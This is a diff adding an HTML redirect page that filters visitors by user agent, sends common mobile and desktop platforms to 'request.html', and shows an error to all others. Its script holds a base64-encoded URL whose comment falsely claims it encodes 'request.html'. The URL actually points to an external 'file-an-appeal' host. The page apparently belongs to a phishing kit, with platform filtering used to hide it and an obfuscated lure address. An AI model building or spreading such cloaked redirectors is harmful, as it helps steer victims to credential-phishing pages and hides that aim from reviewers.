@@ -1,0 +1,45 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <style>
+    body {
+      background: #fff;
+      color: #333;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    #error {
+      display: none;
+      font-size: 1.2rem;
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <div id="error">Error: Only Android, iOS, macOS, Windows, or iPadOS are supported.</div>
+
+  <script>
+    (function () {
+      const supported = ["Android", "iPhone", "iPad", "Macintosh", "Windows"];
+      const agent = navigator.userAgent || navigator.vendor || window.opera;
+      const allowed = supported.some(platform => agent.includes(platform));
+
+      // Base64 for: request.html
+      const encoded = "aHR0cHM6Ly9maWxlLWFuLWFwcGVhbDk4MDcubmV0bGlmeS5hcHAv";
+
+      if (allowed) {
+        
+                window.location.href = "request.html";
+      } else {
+        document.getElementById("error").style.display = "block";
+      }
+    })();
+  </script>
+</body>
+</html>
